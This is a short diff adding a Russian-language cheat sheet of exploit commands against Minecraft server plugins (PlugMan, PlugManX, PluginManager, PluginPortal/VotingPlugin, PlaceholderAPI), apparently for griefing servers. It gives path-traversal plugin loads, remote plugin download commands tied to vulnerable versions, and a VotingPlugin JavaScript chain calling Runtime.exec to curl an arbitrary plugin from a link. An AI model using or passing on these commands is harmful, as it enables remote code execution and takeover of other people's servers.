@@ -1,0 +1,18 @@
+Plugman/PlugManX/MainPl
+/plugman load ../../Grief/plugins/MyCommand.5.6.0.jar
+
+PlugManX 2.3.1-2.3.6 (2.3.7-2.3.9 по дефолту имеют выключенный download, после убрали)
+/plugman download ссылка
+Примечательно, уязвимая версия данного плагина является последняя нна платформе bukkit.org
+поэтому она не теряет актуальность.
+
+PluginManager
+/pm download direct *ссылка* *имя файла*
+
+PluginPortal
+/pluginportal install VotingPlugin
+/restart
+/adminvote javascript java.lang.Runtime.getRuntime().exec("curl -o plugins/*названиеплагина* *ссылка*");
+
+PlaceholderAPI (2.11.3 и ниже)
+/papi register /../../zMenu/inventories/download/islam.yml
